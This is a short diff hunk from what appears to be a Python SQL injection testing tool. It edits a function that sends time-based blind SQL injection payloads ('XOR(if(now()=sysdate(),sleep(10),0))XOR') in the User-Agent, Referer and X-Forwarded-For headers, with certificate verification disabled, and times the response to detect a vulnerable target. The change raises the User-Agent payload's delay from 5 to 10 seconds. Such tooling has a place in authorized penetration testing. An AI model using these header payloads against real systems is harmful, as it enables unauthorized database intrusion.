@@ -61,7 +61,7 @@ def sqli_request(url):
     if args.inject == "default-payload":
         try:
             s = requests.Session()
-            headers = {"User-Agent": '"XOR(if(now()=sysdate(),sleep(5),0))XOR"' ,"Referer" : "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z","X-Forwarded-For":"0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" ,"Useref":args.message}
+            headers = {"User-Agent": '"XOR(if(now()=sysdate(),sleep(10),0))XOR"' ,"Referer" : "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z","X-Forwarded-For":"0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z" ,"Useref":args.message}
             burp_proxy={"http":args.proxy, "https":args.proxy}
             testrequest = s.get(url , headers=headers , verify=False )
             sleeptestrequest = testrequest.elapsed.total_seconds()  
